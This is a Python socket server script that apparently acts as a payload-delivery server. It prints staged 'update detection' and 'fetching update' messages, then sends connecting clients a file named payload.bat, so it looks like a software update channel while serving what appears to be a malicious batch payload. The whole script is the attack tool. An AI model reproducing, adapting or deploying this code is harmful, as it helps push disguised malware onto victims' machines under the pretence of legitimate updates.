import socket,threading,time,os
from colorama import Fore
print(Fore.RED+'######################################################\n');print("Do NOT forget to change PORT AND SERVER IP IN CLIENT");print('\n######################################################\n\n')
PORT=5090
format="utf-8"
hostname=socket.gethostname()
#SERVER2=socket.gethostbyname(socket.gethostname()) #ip by nic card
SERVER2="192.168.23.117" #ip by connection
print(f"[THIS SERVER ADDRESS] {SERVER2}")
print(f"[THIS SERVER HOSTNAME] {hostname}")
ADDR2=(SERVER2,PORT)
DISCONNECT_MESSAGE= "!DISCONNECT"

SERVER2=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
SERVER2.bind(ADDR2)
def file1(conn):
    #### enter the file path #####
    filesize = os.path.getsize("payload.bat")
    ##also enter file path##
    with open("payload.bat", 'rb') as f:
        data =f.read(1024)
        conn.send(str(filesize).encode(format))
        conn.send(data)
        time.sleep(2)
        conn.send(b"<DONE>")
        f.close()
        conn.close()

def handle_client(conn, addr):
    print(Fore.WHITE+"\n[NEW CONNECTION]"+Fore.GREEN+f"{addr}"+Fore.WHITE+" connected.")

    connected=True
    while connected:#hence the threading
        msg_length = conn.recv(64).decode(format)
        
        if msg_length:
            msg_length = int(msg_length)
            msg = conn.recv(msg_length).decode(format)
            print(f"[{addr}] {msg}")
            print("Update detection started...");print("...");time.sleep(3)
            print(".....");time.sleep(1);print(f"{addr}: Done");time.sleep(2)
            print(f"[FETCHING] update for {addr}"); time.sleep(1)
            print(f"Sending to{addr}"+Fore.GREEN+f"\nSent to {addr}")
            file1(conn)
            conn.close()
            connected=False
def start():
    SERVER2.listen()
    print(f"[LISTENING] server is listening on {SERVER2}")
    while True:
        conn, addr= SERVER2.accept()
        thread = threading.Thread(target=handle_client, args=(conn, addr))
        thread.start()
        print(f"[ACTIVE CONNECTIONS] {threading.active_count()-1}")


print(Fore.GREEN+"[STARTING] server is starting...")
start()
